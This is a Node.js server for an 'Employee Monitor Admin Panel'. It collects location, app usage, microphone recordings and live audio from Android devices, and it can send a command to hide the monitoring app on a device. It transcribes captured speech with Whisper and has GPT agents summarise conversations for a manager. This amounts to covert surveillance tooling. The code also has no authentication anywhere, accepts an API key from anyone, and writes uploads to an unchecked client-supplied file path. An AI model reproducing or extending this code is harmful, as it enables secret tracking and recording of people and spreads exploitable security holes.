const express        = require('express');
const http           = require('http');
const { Server }     = require('socket.io');
const path           = require('path');
const fs             = require('fs-extra');
const OpenAI         = require('openai');

const app    = express();
const server = http.createServer(app);
const io     = new Server(server, {
    cors: { origin: '*', methods: ['GET','POST'] },
    maxHttpBufferSize: 50e6
});

const PORT = process.env.PORT || 3000;

// ─── Directories ───────────────────────────────────────────────
const DATA_DIR   = path.join(__dirname, 'data');
const AUDIO_DIR  = path.join(DATA_DIR, 'audio');
const LOGS_DIR   = path.join(DATA_DIR, 'logs');
try { fs.ensureDirSync(DATA_DIR); fs.ensureDirSync(AUDIO_DIR); fs.ensureDirSync(LOGS_DIR); }
catch(e) { console.warn('Dir creation warning:', e.message); }

// ─── In-memory stores ──────────────────────────────────────────
const employees    = new Map();   // employeeId → { info, socketId }
const locationLogs = new Map();   // employeeId → [ ...events ]
const appUsageLogs = new Map();   // employeeId → [ ...events ]
const voiceLogs    = new Map();   // employeeId → [ ...filenames ]
const hiddenApps   = new Map();   // employeeId → boolean
const notices      = [];          // [ { id, title, message, createdAt } ]

// ─── AI Agent (CrewAI-style) ───────────────────────────────────
let openaiApiKey   = process.env.OPENAI_API_KEY || '';
const aiAgentState = new Map();   // employeeId → { active, startTime, usageBuffer[], voiceBuffer[] }
const aiSummaries  = [];          // [ { id, employeeId, employeeName, summary, appAnalysis, voiceAnalysis, createdAt } ]

// ─── Middleware ────────────────────────────────────────────────
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/audio', express.static(AUDIO_DIR)); // serve recorded audio

// ─── Routes ───────────────────────────────────────────────────

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// ─── API Endpoints ─────────────────────────────────────────────

app.get('/api/employees', (req, res) => {
    const list = [];
    employees.forEach((emp, id) => {
        list.push({
            employeeId:   id,
            employeeName: emp.info.employeeName,
            device:       emp.info.device,
            androidVersion: emp.info.androidVersion,
            online:       emp.online,
            lastSeen:     emp.lastSeen,
            appHidden:    hiddenApps.get(id) || false,
            locationCount: (locationLogs.get(id) || []).length,
            voiceCount:   (voiceLogs.get(id) || []).length,
            appCount:     (appUsageLogs.get(id) || []).length
        });
    });
    res.json(list);
});

app.get('/api/location/:empId', (req, res) => {
    const logs = locationLogs.get(req.params.empId) || [];
    res.json(logs.slice(-200)); // last 200 points
});

app.get('/api/appusage/:empId', (req, res) => {
    const logs = appUsageLogs.get(req.params.empId) || [];

    // Aggregate: sum usage per app
    const agg = {};
    logs.forEach(e => {
        if (!agg[e.appName]) agg[e.appName] = { appName: e.appName, packageName: e.packageName, totalMs: 0, entries: 0 };
        agg[e.appName].totalMs  += e.usageMs;
        agg[e.appName].entries  += 1;
        agg[e.appName].lastUsed  = e.lastUsed;
    });

    const result = Object.values(agg)
        .sort((a,b) => b.totalMs - a.totalMs)
        .slice(0, 50);
    res.json(result);
});

// App usage time-based history
app.get('/api/appusage/:empId/history', (req, res) => {
    const logs = appUsageLogs.get(req.params.empId) || [];
    const from = parseInt(req.query.from) || 0;
    const to   = parseInt(req.query.to)   || Date.now();

    // Filter entries within time range
    const filtered = logs.filter(e => {
        const t = e.timestamp || new Date(e.receivedAt).getTime();
        return t >= from && t <= to;
    });

    // Group by hour
    const hourly = {};
    filtered.forEach(e => {
        const t = new Date(e.timestamp || e.receivedAt);
        const hourKey = t.getFullYear() + '-' +
            String(t.getMonth()+1).padStart(2,'0') + '-' +
            String(t.getDate()).padStart(2,'0') + ' ' +
            String(t.getHours()).padStart(2,'0') + ':00';

        if (!hourly[hourKey]) hourly[hourKey] = {};
        if (!hourly[hourKey][e.appName]) hourly[hourKey][e.appName] = { appName: e.appName, packageName: e.packageName, totalMs: 0 };
        hourly[hourKey][e.appName].totalMs += e.usageMs;
    });

    // Convert to sorted array
    const result = Object.entries(hourly)
        .sort((a,b) => b[0].localeCompare(a[0]))
        .map(([hour, apps]) => ({
            hour,
            apps: Object.values(apps).sort((a,b) => b.totalMs - a.totalMs)
        }));
    res.json(result);
});

app.get('/api/voice/:empId', (req, res) => {
    const files = voiceLogs.get(req.params.empId) || [];
    res.json(files.slice(-50).reverse()); // last 50
});

app.get('/api/stats', (req, res) => {
    let onlineCount = 0;
    employees.forEach(e => { if (e.online) onlineCount++; });
    res.json({
        totalEmployees: employees.size,
        onlineNow: onlineCount,
        totalVoiceFiles: [...voiceLogs.values()].reduce((s,a) => s + a.length, 0)
    });
});

// ─── DELETE Endpoints ──────────────────────────────────────────

app.delete('/api/employees/:empId', (req, res) => {
    const id = req.params.empId;
    employees.delete(id);
    locationLogs.delete(id);
    appUsageLogs.delete(id);
    voiceLogs.delete(id);
    hiddenApps.delete(id);
    // Delete audio files
    const empAudioDir = path.join(AUDIO_DIR, id);
    fs.remove(empAudioDir).catch(() => {});
    io.emit('stats_update', getStats());
    res.json({ success: true, message: `Employee ${id} and all data deleted` });
});

app.delete('/api/location/:empId', (req, res) => {
    locationLogs.delete(req.params.empId);
    res.json({ success: true, message: 'Location data deleted' });
});

app.delete('/api/appusage/:empId', (req, res) => {
    appUsageLogs.delete(req.params.empId);
    res.json({ success: true, message: 'App usage data deleted' });
});

app.delete('/api/voice/:empId', (req, res) => {
    voiceLogs.delete(req.params.empId);
    const empAudioDir = path.join(AUDIO_DIR, req.params.empId);
    fs.remove(empAudioDir).catch(() => {});
    io.emit('stats_update', getStats());
    res.json({ success: true, message: 'Voice recordings deleted' });
});

app.delete('/api/voice/:empId/:filename', (req, res) => {
    const { empId, filename } = req.params;
    const files = voiceLogs.get(empId) || [];
    const idx = files.findIndex(f => f.filename === filename);
    if (idx !== -1) {
        files.splice(idx, 1);
        const filePath = path.join(AUDIO_DIR, empId, filename);
        fs.remove(filePath).catch(() => {});
    }
    io.emit('stats_update', getStats());
    res.json({ success: true, message: 'Voice recording deleted' });
});

app.delete('/api/voice-all', (req, res) => {
    voiceLogs.clear();
    fs.emptyDir(AUDIO_DIR).catch(() => {});
    io.emit('stats_update', getStats());
    res.json({ success: true, message: 'All voice recordings deleted' });
});

// ─── Notice Board API ──────────────────────────────────────────

app.get('/api/notices', (req, res) => {
    res.json(notices.slice().reverse());
});

app.post('/api/notices', (req, res) => {
    const { title, message } = req.body;
    if (!title || !message) {
        return res.status(400).json({ error: 'Title and message are required' });
    }
    const notice = {
        id: Date.now().toString(),
        title: String(title).substring(0, 200),
        message: String(message).substring(0, 2000),
        createdAt: new Date()
    };
    notices.push(notice);
    // Keep only last 100 notices
    if (notices.length > 100) notices.splice(0, notices.length - 100);
    // Broadcast to all connected devices and admin panels
    io.emit('new_notice', notice);
    res.json({ success: true, notice });
});

app.delete('/api/notices/:id', (req, res) => {
    const idx = notices.findIndex(n => n.id === req.params.id);
    if (idx !== -1) notices.splice(idx, 1);
    io.emit('notices_updated', notices.slice().reverse());
    res.json({ success: true });
});

// ─── AI Agent (CrewAI-style) API ───────────────────────────────

// Set/check API key
app.post('/api/ai-config', (req, res) => {
    const { apiKey } = req.body;
    if (!apiKey || typeof apiKey !== 'string' || apiKey.length < 10) {
        return res.status(400).json({ error: 'Invalid API key' });
    }
    openaiApiKey = apiKey;
    res.json({ success: true });
});

app.get('/api/ai-config', (req, res) => {
    res.json({ configured: !!openaiApiKey });
});

// Toggle AI agent on/off per employee
app.post('/api/ai-agent/toggle', async (req, res) => {
    const { employeeId } = req.body;
    if (!employeeId) return res.status(400).json({ error: 'employeeId required' });

    const state = aiAgentState.get(employeeId);

    if (state && state.active) {
        // Turning OFF → generate summary
        state.active = false;
        aiAgentState.set(employeeId, state);
        io.emit('ai_agent_toggled', { employeeId, active: false, generating: true });

        try {
            const summary = await generateCrewAISummary(employeeId, state);
            io.emit('ai_summary_ready', summary);
            io.emit('ai_agent_toggled', { employeeId, active: false, generating: false });
            res.json({ success: true, active: false, summary });
        } catch (err) {
            console.error('AI summary error:', err);
            io.emit('ai_agent_toggled', { employeeId, active: false, generating: false });
            res.status(500).json({ error: 'Failed to generate summary: ' + err.message });
        }
    } else {
        // Turning ON → start monitoring
        aiAgentState.set(employeeId, {
            active: true,
            startTime: Date.now(),
            usageBuffer: [],
            voiceBuffer: []
        });
        io.emit('ai_agent_toggled', { employeeId, active: true });
        res.json({ success: true, active: true });
    }
});

app.get('/api/ai-agent/status/:empId', (req, res) => {
    const state = aiAgentState.get(req.params.empId);
    res.json({ active: state ? state.active : false, startTime: state?.startTime || null });
});

app.get('/api/ai-summaries', (req, res) => {
    res.json(aiSummaries.slice().reverse());
});

app.delete('/api/ai-summaries/:id', (req, res) => {
    const idx = aiSummaries.findIndex(s => s.id === req.params.id);
    if (idx !== -1) aiSummaries.splice(idx, 1);
    res.json({ success: true });
});

// ─── CrewAI-style Multi-Agent Summary Generator ────────────────

async function generateCrewAISummary(employeeId, state) {
    if (!openaiApiKey) throw new Error('OpenAI API key not configured');

    const openai = new OpenAI({ apiKey: openaiApiKey });
    const emp = employees.get(employeeId);
    const employeeName = emp ? emp.info.employeeName : employeeId;

    // Gather app usage data since monitoring started
    const allUsage = appUsageLogs.get(employeeId) || [];
    const usageData = allUsage.concat(state.usageBuffer || []).filter(e => {
        const t = e.timestamp || new Date(e.receivedAt).getTime();
        return t >= state.startTime;
    });

    // Aggregate app usage
    const appAgg = {};
    usageData.forEach(e => {
        if (!appAgg[e.appName]) appAgg[e.appName] = 0;
        appAgg[e.appName] += e.usageMs || 0;
    });
    const appUsageText = Object.entries(appAgg)
        .sort((a, b) => b[1] - a[1])
        .map(([app, ms]) => `${app}: ${Math.round(ms / 60000)} minutes`)
        .join('\n') || 'No app usage data collected.';

    // Gather voice transcriptions
    let voiceText = 'No voice recordings during this monitoring period.';
    const recentVoices = (voiceLogs.get(employeeId) || [])
        .filter(v => new Date(v.receivedAt).getTime() >= state.startTime)
        .slice(-10); // Last 10 files max

    if (recentVoices.length > 0) {
        const transcriptions = [];
        for (const vf of recentVoices) {
            try {
                const filePath = path.join(AUDIO_DIR, employeeId, vf.filename);
                if (await fs.pathExists(filePath)) {
                    const fileStream = fs.createReadStream(filePath);
                    const transcription = await openai.audio.transcriptions.create({
                        model: 'whisper-1',
                        file: fileStream,
                        language: 'en'
                    });
                    if (transcription.text && transcription.text.trim()) {
                        transcriptions.push(transcription.text.trim());
                    }
                }
            } catch (e) {
                console.warn('Transcription error for', vf.filename, e.message);
            }
        }
        if (transcriptions.length > 0) {
            voiceText = transcriptions.join('\n\n');
        }
    }

    // ── Agent 1: App Usage Analyst ──
    const agent1Response = await openai.chat.completions.create({
        model: 'gpt-4o-mini',
        messages: [
            {
                role: 'system',
                content: 'You are an App Usage Analyst agent. Analyze the app usage data and provide a concise insight (3-5 sentences) about which apps were used most, total screen time patterns, and any notable observations. Be direct and factual.'
            },
            {
                role: 'user',
                content: `Employee: ${employeeName}\nMonitoring period: ${new Date(state.startTime).toLocaleString()} to ${new Date().toLocaleString()}\n\nApp Usage Data:\n${appUsageText}`
            }
        ],
        max_tokens: 300,
        temperature: 0.3
    });
    const appAnalysis = agent1Response.choices[0].message.content;

    // ── Agent 2: Voice Content Analyst ──
    const agent2Response = await openai.chat.completions.create({
        model: 'gpt-4o-mini',
        messages: [
            {
                role: 'system',
                content: 'You are a Voice Content Analyst agent. Analyze the following voice transcriptions and identify the main topics discussed, key points mentioned, and a brief summary of what was talked about. Be concise (3-5 sentences). If no transcription data is available, state that.'
            },
            {
                role: 'user',
                content: `Employee: ${employeeName}\n\nVoice Transcriptions:\n${voiceText}`
            }
        ],
        max_tokens: 300,
        temperature: 0.3
    });
    const voiceAnalysis = agent2Response.choices[0].message.content;

    // ── Agent 3: Summary Compiler ──
    const agent3Response = await openai.chat.completions.create({
        model: 'gpt-4o-mini',
        messages: [
            {
                role: 'system',
                content: 'You are a Summary Compiler agent. Combine the app usage analysis and voice content analysis into ONE short, professional summary (4-6 sentences) for a manager. Highlight the most important findings. Start with the employee name.'
            },
            {
                role: 'user',
                content: `App Usage Analysis:\n${appAnalysis}\n\nVoice Content Analysis:\n${voiceAnalysis}`
            }
        ],
        max_tokens: 400,
        temperature: 0.3
    });
    const finalSummary = agent3Response.choices[0].message.content;

    const summaryObj = {
        id: Date.now().toString(),
        employeeId,
        employeeName,
        summary: finalSummary,
        appAnalysis,
        voiceAnalysis,
        monitoringStart: new Date(state.startTime),
        monitoringEnd: new Date(),
        createdAt: new Date()
    };

    aiSummaries.push(summaryObj);
    if (aiSummaries.length > 50) aiSummaries.splice(0, aiSummaries.length - 50);

    return summaryObj;
}

// ─── Socket.IO ────────────────────────────────────────────────

io.on('connection', (socket) => {
    console.log('New connection:', socket.id);

    // ── Employee registers ──
    socket.on('employee_register', (data) => {
        const { employeeId, employeeName, device, androidVersion } = data;
        console.log(`Employee registered: ${employeeName} (${employeeId})`);

        employees.set(employeeId, {
            info: { employeeId, employeeName, device, androidVersion },
            socketId: socket.id,
            online: true,
            lastSeen: new Date()
        });

        socket.employeeId = employeeId;

        io.emit('employee_status_change', { employeeId, employeeName, online: true });
        io.emit('stats_update', getStats());
    });

    // ── Location update ──
    socket.on('location_update', (data) => {
        const { employeeId, employeeName } = data;
        if (!locationLogs.has(employeeId)) locationLogs.set(employeeId, []);

        const event = { ...data, receivedAt: new Date() };
        locationLogs.get(employeeId).push(event);

        // Keep only last 1000 per employee
        const arr = locationLogs.get(employeeId);
        if (arr.length > 1000) arr.splice(0, arr.length - 1000);

        // Broadcast to admin panel
        io.emit('live_location', event);

        // Write to log file (async)
        appendToLog(employeeId, 'location', event);
    });

    // ── App usage ──
    socket.on('app_usage', (data) => {
        const { employeeId } = data;
        if (!appUsageLogs.has(employeeId)) appUsageLogs.set(employeeId, []);
        appUsageLogs.get(employeeId).push({ ...data, receivedAt: new Date() });

        // Trim to last 5000
        const arr = appUsageLogs.get(employeeId);
        if (arr.length > 5000) arr.splice(0, arr.length - 5000);

        // Feed into AI agent buffer if active
        const aiState = aiAgentState.get(employeeId);
        if (aiState && aiState.active) {
            aiState.usageBuffer.push({ ...data, receivedAt: new Date() });
        }

        io.emit('live_app_usage', data);
        appendToLog(employeeId, 'appusage', data);
    });

    // ── Voice recording ──
    socket.on('voice_data', async (data) => {
        const { employeeId, employeeName, audioData, filename, timestamp, durationMs } = data;

        try {
            const empDir = path.join(AUDIO_DIR, employeeId);
            await fs.ensureDir(empDir);

            const filePath = path.join(empDir, filename);
            const buffer   = Buffer.from(audioData, 'base64');
            await fs.writeFile(filePath, buffer);

            const fileInfo = {
                filename,
                employeeId,
                employeeName,
                timestamp,
                durationMs,
                url: `/audio/${employeeId}/${filename}`,
                receivedAt: new Date()
            };

            if (!voiceLogs.has(employeeId)) voiceLogs.set(employeeId, []);
            voiceLogs.get(employeeId).push(fileInfo);

            io.emit('new_voice_recording', fileInfo);
            console.log(`Voice saved: ${filename} (${(buffer.length/1024).toFixed(1)} KB)`);
        } catch (err) {
            console.error('Voice save error:', err);
        }
    });

    // ── Real-time audio stream relay ──
    socket.on('audio_stream', (data) => {
        // Relay live audio to all admin panels
        console.log(`Audio chunk from ${data.employeeId}, size=${data.audioChunk?.length || 0}`);
        socket.broadcast.emit('audio_stream', data);
    });

    // ── App hidden status from device ──
    socket.on('app_hidden_status', (data) => {
        const { employeeId, hidden } = data;
        hiddenApps.set(employeeId, hidden);
        io.emit('app_hidden_changed', { employeeId, hidden });
    });

    // ── Admin sends hide/unhide command ──
    socket.on('admin_hide_app', (data) => {
        const { employeeId, hide } = data;
        io.emit('command_hide_app', { employeeId, hide });
        hiddenApps.set(employeeId, hide);
        io.emit('app_hidden_changed', { employeeId, hidden: hide });
    });

    // ── Disconnect ──
    socket.on('disconnect', () => {
        if (socket.employeeId) {
            const emp = employees.get(socket.employeeId);
            if (emp) {
                emp.online   = false;
                emp.lastSeen = new Date();
                io.emit('employee_status_change', {
                    employeeId:   socket.employeeId,
                    employeeName: emp.info.employeeName,
                    online: false
                });
                io.emit('stats_update', getStats());
            }
        }
        console.log('Disconnected:', socket.id);
    });
});

// ─── Helpers ──────────────────────────────────────────────────

function getStats() {
    let onlineCount = 0;
    employees.forEach(e => { if (e.online) onlineCount++; });
    return {
        totalEmployees: employees.size,
        onlineNow: onlineCount,
        totalVoiceFiles: [...voiceLogs.values()].reduce((s,a) => s + a.length, 0)
    };
}

async function appendToLog(employeeId, type, data) {
    const file = path.join(LOGS_DIR, `${employeeId}_${type}.jsonl`);
    try {
        await fs.appendFile(file, JSON.stringify(data) + '\n');
    } catch(e) { /* non-critical */ }
}

// ─── Start ────────────────────────────────────────────────────

server.listen(PORT, '0.0.0.0', () => {
    console.log(`
╔═══════════════════════════════════════╗
║  Employee Monitor Admin Panel         ║
║  Running on port ${PORT}                ║
╚═══════════════════════════════════════╝
    `);
});
